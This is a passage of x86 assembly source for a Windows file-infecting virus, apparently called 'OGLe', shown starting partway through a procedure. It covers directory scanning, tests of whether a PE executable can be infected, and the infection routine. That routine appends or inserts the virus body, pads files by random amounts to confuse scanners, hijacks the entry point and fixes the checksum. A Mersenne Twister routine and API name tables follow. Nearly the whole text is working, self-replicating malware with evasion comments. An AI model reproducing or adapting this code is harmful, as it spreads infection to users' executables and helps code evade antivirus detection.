        enter   MAX_PATH * 2, 0
        mov     ecx, esp
        push    eax
        push    esp
        push    ecx
        push    MAX_PATH
        push    edi
        call    dword ptr [eax + krncrcstk2.k2GetFullPathNameW]
        xchg    edi, eax
        pop     eax
        xor     ebx, ebx
        call    dword ptr [ebp + 8 + krncrcstk2.k2GetVersion]
        test    eax, eax
        jns     call_sfcapi
        mov     ecx, esp
        xchg    ebp, eax
        enter   MAX_PATH * 2, 0
        xchg    ebp, eax
        mov     eax, esp
        push    MAX_PATH
        push    eax
        inc     edi
        push    edi
        push    ecx
        push    ebx                             ;use default translation
        push    ebx                             ;CP_ANSI
        call    dword ptr [ebp + 8 + krncrcstk2.k2MultiByteToWideChar]

call_sfcapi     label   near

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        mov     ecx, dword ptr [ebp + 8 + krncrcstk2.k2SfcIsFileProtected]
        xor     eax, eax                        ;fake success in case of no SFC
        jecxz   leave_sfc
        push    esp
        push    ebx
        call    ecx

leave_sfc       label   near
        leave
        test    eax, eax
        jne     restore_attr
        call    set_fileattr
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    GENERIC_READ or GENERIC_WRITE
        push    edi
        call    dword ptr [ebp + krncrcstk2.k2CreateFileW]
        xchg    ebx, eax
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)
        lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
        push    eax
        sub     eax, 8
        push    eax
        push    0
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk2.k2SetFileTime + 10h]
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk2.k2CloseHandle + 4]

restore_attr    label   near
        pop     ebx                             ;restore original file attributes
        call    set_fileattr
        jmp     find_next
scan_dir        endp

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr        proc    near                    ;edi -> map view
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        jne     pehdr_ret
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        add     esi, edi
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret       label   near
        ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
is_pehdr        endp

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
        push    ebx
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        push    edi
        call    dword ptr [ebp + krncrcstk2.k2SetFileAttributesW]
        ret                                     ;edi -> filename
set_fileattr    endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
        call    map_view
        mov     ebp, esi
        call    is_pehdr
        jne     inftest_ret
        lods    dword ptr [esi]
        cmp     ax, IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only Intel 386+
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
        mov     ecx, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;-----------------------------------------------------------------------------

        test    ch, (IMAGE_FILE_SYSTEM or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
        jne     inftest_ret
        add     esi, pehdr.peentrypoint - pehdr.pecoff.petimedate

;-----------------------------------------------------------------------------
;if file is a .dll, then we require an entry point function
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]
        xchg    ecx, eax
        test    ah, IMAGE_FILE_DLL shr 8
        je      test_system
        jecxz   inftest_ret

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

test_system     label   near
        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecodebase]
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        jnbe    inftest_ret
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        jb      inftest_ret
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        jb      inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecodebase], eax
        jnbe    inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecodebase]
        add     eax, edx
        mov     ebx, dword ptr [esi + pehdr.pefilealign - pehdr.pecodebase]
        lea     esi, dword ptr [esi + eax - pehdr.pecodebase + pehdr.pemagic - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        add     eax, dword ptr [esi]
        cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
        jne     inftest_ret                     ;file contains appended data
        add     dword ptr [ebp + findlist.finddata.dwFileSizeLow], ebx
        inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                ;skip call mask

inftest_ret     label   near
        int     3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append     proc    near
        call    dword ptr [esp + size mapstack - 4 + krncrcstk2.k2GetTickCount]
        and     eax, RANDPADMAX - 1

allocsize2      label   near
        add     ax, small ((((offset ogle_codeend - offset ogle_codebegin) + 3) and -4) + RANDPADMIN)

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
        cdq
        add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
        push    eax
        mov     ecx, esp
        push    eax                             ;MapViewOfFile
        push    edx                             ;MapViewOfFile
        push    edx                             ;MapViewOfFile
        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
        push    edx
        push    eax
        push    edx
        push    PAGE_READWRITE
        push    edx
        push    ebx
        call    dword ptr [ecx + size mapstack + krncrcstk2.k2CreateFileMappingA]
                                                ;ANSI map is allowed because of no name
        push    eax
        xchg    edi, eax
        call    dword ptr [esp + size mapstack + krncrcstk2.k2MapViewOfFile + 14h]
        pop     ecx
        xchg    edi, eax                        ;should succeed even if file cannot be opened
        pushad
        call    unmap_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad                                   ;SEH destroys all registers
        push    eax
        push    edi
        call    dword ptr [esp + size mapstack + krncrcstk2.k2UnmapViewOfFile + 4]
        call    dword ptr [esp + size mapstack + krncrcstk2.k2CloseHandle]
        pop     eax
        ret

unmap_seh       proc    near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
unmap_seh       endp
map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
open_append     endp

;-----------------------------------------------------------------------------
;infect file
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and garbage or many zeroes)
;               entry point is altered to point to our code.  very simple
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        call    open_append

delta_label     label   near
        push    ecx
        push    edi
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        xor     ecx, ecx
        imul    cx, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum], size pesect
        add     cx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        lea     esi, dword ptr [ebx + ecx + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]

allocsize3      label   near
        mov     cx, ((offset ogle_codeend - offset ogle_codebegin) + 3) and -4
        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
        push    eax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff     label   near
        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
        pop     eax
        push    esi
        add     edi, dword ptr [esi]
        lea     esi, dword ptr [edi + eax - 1]
        lea     edi, dword ptr [esi + ecx]
        xchg    ecx, eax
        std
        rep     movs byte ptr [edi], byte ptr [esi]
        cld
        pop     esi
        pop     edi
        push    edi
        push    ecx
        xchg    ecx, eax

copy_code       label   near
        pop     edx
        add     ebp, edx
        xchg    ebp, eax
        add     edx, dword ptr [esi]
        add     edi, edx
        push    esi
        push    edi

bodyoff         label   near
        mov     esi, "!bgr"
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     edi
        pop     esi

;-----------------------------------------------------------------------------
;section attributes are always altered to executable because for Windows XP SP2
;you can remove that bit, if you want, but we need the writable bit for RNG
;-----------------------------------------------------------------------------

        or      byte ptr [esi + pesect.sectflags - pesect.sectrawaddr + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h

;-----------------------------------------------------------------------------
;alter entry point
;-----------------------------------------------------------------------------

        xchg    dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum], eax
        mov     dword ptr [edi + (offset host_patch - offset ogle_codebegin) + 1], eax
        pop     edi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xor     ecx, ecx
        xchg    dword ptr [ebx], ecx
        jecxz   infect_ret
        cdq
        pop     ecx
        push    ecx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum   label   near
        adc     dx, word ptr [edi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     dword ptr [ebx]
        adc     dword ptr [ebx], edx            ;avoid common bug.  ADC not ADD

infect_ret      label   near
        int     3                               ;common exit using SEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
test_infect     endp

;-----------------------------------------------------------------------------
;Mersenne Twister RNG MT19937 (c) 1997 Makoto Matsumoto and Takuji Nishimura
;period is ((2^19937)-1) with 623-dimensionally equidistributed sequence
;asm port and size optimise by rgb in 2002
;-----------------------------------------------------------------------------

randinit        proc    near                    ;eax = seed, ecx = 0, edi -> RNG cache
        pushad
        push    edi
        or      eax, 1
        mov     ecx, statelen

init_loop       label   near
        stos    dword ptr [edi]
        mov     edx, 69069
        mul     edx                             ;Knuth label   near x_new = x_old * 69069
        loop    init_loop
        inc     ecx                             ;force reload
        call    initdelta

initdelta       label   near
        pop     edi
        add     edi, offset randvars - offset initdelta
        xchg    ecx, eax
        stos    dword ptr [edi]
        pop     eax
        stos    dword ptr [edi]
        stos    dword ptr [edi]
        popad

random          proc    near
        pushad
        call    randelta

randvars        label   near
        db      'rgb!'                          ;numbers left
        db      'rgb!'                          ;next pointer
        db      'rgb!'                          ;state pointer

randelta        label   near
        pop     esi
        push    esi
        lods    dword ptr [esi]
        xchg    ecx, eax
        lods    dword ptr [esi]
        xchg    esi, eax
        loop    random_ret
        mov     cx, statelen - period
        mov     esi, dword ptr [eax]
        lea     ebx, dword ptr [esi + (period * 4)]
        mov     edi, esi
        push    esi
        lods    dword ptr [esi]
        xchg    edx, eax
        call    twist
        pop     ebx
        mov     cx, period - 1
        push    ecx
        push    ebx
        call    twist
        pop     esi
        push    esi
        inc     ecx
        call    twist
        xchg    edx, eax
        pop     esi
        pop     ecx
        inc     ecx

random_ret      label   near
        lods    dword ptr [esi]
        mov     edx, eax
        shr     eax, tshiftU
        xor     eax, edx
        mov     edx, eax
        shl     eax, tshiftS
        and     eax, tmaskB
        xor     eax, edx
        mov     edx, eax
        shl     eax, tshiftT
        and     eax, tmaskC
        xor     eax, edx
        mov     edx, eax
        shr     eax, tshiftL
        xor     eax, edx
        pop     edi
        mov     dword ptr [esp + 1ch], eax      ;eax in pushad
        xchg    ecx, eax
        stos    dword ptr [edi]
        xchg    esi, eax
        stos    dword ptr [edi]
        popad
        ret
random          endp
randinit        endp

twist           proc    near
        lods    dword ptr [esi]
        push    eax
        add     eax, eax                        ;remove highest bit
        add     edx, edx                        ;test highest bit
        rcr     eax, 2                          ;merge bits and test lowest bit
        jnb     twist_skip                      ;remove branch but larger using
        xor     eax, matrixA                    ;sbb edx, edx+and edx, matrixA+xor eax, edx

twist_skip      label   near
        xor     eax, dword ptr [ebx]
        add     ebx, 4
        stos    dword ptr [edi]
        pop     edx
        loop    twist
        ret
twist           endp

ogle_codeend    label   near

create_crcs     proc    near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stos    dword ptr [edi]
        dec     edx
        jne     create_crcs
        ret
create_crcs     endp

do_message      label   near
        xor     eax, eax
        push    eax
        push    offset txttitle
        push    offset txtbody
        push    eax
        call    MessageBoxA
        push    eax
        call    ExitProcess

;must be alphabetical order
;API names are not present in replications, only in dropper

krnnames        db      "GetModuleHandleA", 0
                db      "GetProcAddress"  , 0
                db      "LoadLibraryA"    , 0
                db      "VirtualAlloc"    , 0

glunames        db      "gluOrtho2D", 0

gdinames        db      "ChoosePixelFormat", 0
                db      "SetPixelFormat"   , 0

usrnames        db      "CreateWindowExA" , 0
                db      "DefWindowProcA"  , 0
                db      "DestroyWindow"   , 0
                db      "GetDC"           , 0
                db      "ReleaseDC"       , 0

oglnames        db      "glBegin"          , 0
                db      "glBindTexture"    , 0
                db      "glDeleteTextures" , 0
                db      "glDrawBuffer"     , 0
if MODE_ATI
                db      "glDrawPixels"     , 0
endif
                db      "glEnd"            , 0
                db      "glGenTextures"    , 0
                db      "glLoadIdentity"   , 0
                db      "glMatrixMode"     , 0
if MODE_ATI
                db      "glRasterPos2i"    , 0
endif
                db      "glReadBuffer"     , 0
                db      "glReadPixels"     , 0
                db      "glTexCoord2f"     , 0
                db      "glTexEnvi"        , 0
                db      "glTexImage2D"     , 0
                db      "glTexParameteri"  , 0
ife MODE_ATI
                db      "glTexSubImage2D"  , 0
endif
                db      "glVertex2f"       , 0
                db      "glViewport"       , 0
                db      "wglCreateContext" , 0
                db      "wglDeleteContext" , 0
                db      "wglGetProcAddress", 0
                db      "wglMakeCurrent"   , 0

krnnames2       db      "CloseHandle"         , 0
                db      "CreateFileA"         , 0
                db      "CreateFileMappingA"  , 0
                db      "CreateFileW"         , 0
                db      "FindClose"           , 0
                db      "FindFirstFileA"      , 0
                db      "FindFirstFileW"      , 0
                db      "FindNextFileA"       , 0
                db      "FindNextFileW"       , 0
                db      "GetFullPathNameA"    , 0
                db      "GetFullPathNameW"    , 0
                db      "GetTickCount"        , 0
                db      "GetVersion"          , 0
                db      "GlobalAlloc"         , 0
                db      "GlobalFree"          , 0
                db      "LoadLibraryA"        , 0
                db      "MapViewOfFile"       , 0
                db      "MultiByteToWideChar" , 0
                db      "SetCurrentDirectoryA", 0
                db      "SetCurrentDirectoryW", 0
                db      "SetFileAttributesA"  , 0
                db      "SetFileAttributesW"  , 0
                db      "SetFileTime"         , 0
                db      "UnmapViewOfFile"     , 0

sfcnames        db      "SfcIsFileProtected", 0

txttitle        db      "OGLe", 0
txtbody         db      "running...", 0

.code
        nop
end     dropper
